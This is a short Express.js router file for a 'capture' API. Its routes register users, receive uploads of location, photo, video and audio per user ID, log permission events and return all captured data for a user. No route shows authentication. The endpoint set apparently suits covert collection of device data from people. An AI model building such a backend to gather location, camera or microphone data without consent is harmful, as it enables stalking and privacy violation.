/**
 * ============================================
 * Capture Routes
 * ============================================
 * API routes for user-based capture (not session-based).
 * Routes: /api/capture/:userId/...
 */

const express = require('express');
const router = express.Router();
const multer = require('multer');
const config = require('../config');
const { captureController } = require('../controllers');

// Configure multer for memory storage
const upload = multer({
    storage: multer.memoryStorage(),
    limits: {
        fileSize: config.storage.maxFileSizeMB * 1024 * 1024
    }
});

/**
 * POST /api/capture/register
 * Register a user for capture notifications
 */
router.post('/register', captureController.registerUser);

/**
 * POST /api/capture/:userId/location
 * Upload location data for a user
 */
router.post('/:userId/location', captureController.uploadLocation);

/**
 * POST /api/capture/:userId/photo
 * Upload photo for a user
 */
router.post('/:userId/photo', upload.single('file'), captureController.uploadPhoto);

/**
 * POST /api/capture/:userId/video
 * Upload video for a user
 */
router.post('/:userId/video', upload.single('file'), captureController.uploadVideo);

/**
 * POST /api/capture/:userId/audio
 * Upload audio for a user
 */
router.post('/:userId/audio', upload.single('file'), captureController.uploadAudio);

/**
 * POST /api/capture/:userId/event
 * Handle permission events
 */
router.post('/:userId/event', captureController.handleEvent);

/**
 * GET /api/capture/:userId/data
 * Get all captured data for a user
 */
router.get('/:userId/data', captureController.getUserData);

module.exports = router;
